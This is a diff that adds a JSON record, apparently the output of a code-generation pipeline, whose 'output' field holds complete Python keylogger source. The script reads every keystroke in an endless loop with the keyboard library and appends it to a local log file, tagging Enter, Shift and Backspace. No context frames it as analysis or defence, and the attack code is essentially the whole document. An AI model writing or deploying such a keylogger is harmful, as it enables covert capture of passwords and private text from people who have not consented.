@@ -1,0 +1,6 @@
+{
+  "output": "import keyboard\n\ndef log_keystrokes():\n    with open(\"keylogs.txt\", \"a\") as log_file:\n        while True:\n            try:\n                event = keyboard.read_event()\n                if event.event_type == keyboard.KEY_DOWN:\n                    key = event.name\n                    if len(key) == 1:\n                        log_file.write(key)\n                    else:\n                        if key == \"enter\":\n                            log_file.write(\"[ENTER]\")\n                        elif key == \"shift\":\n                            log_file.write(\"[SHIFT]\")\n                        elif key == \"backspace\":\n                            log_file.write(\"[BACKSPACE]\")\n                    print(event.name)\n            except Exception as e:\n                print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    log_keystrokes()",
+  "notes": "",
+  "applied_fixes": [],
+  "iterations": 1
+}
